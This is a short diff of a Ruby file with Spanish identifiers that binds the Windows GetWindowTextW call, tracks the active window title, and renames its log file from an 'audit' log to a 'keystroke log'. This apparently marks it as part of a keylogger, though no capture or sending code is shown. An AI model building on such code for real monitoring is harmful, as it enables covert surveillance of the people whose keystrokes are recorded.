@@ -11,7 +11,7 @@ module Win32
   extern 'int GetWindowTextW(long, char*, int)' # Versión Unicode (W)
 end
 
-ARCHIVO_LOG = "log_auditoria.txt"
+ARCHIVO_LOG = "registro_teclas.txt"
 $ultima_ventana = ""
 
 def obtener_titulo_ventana
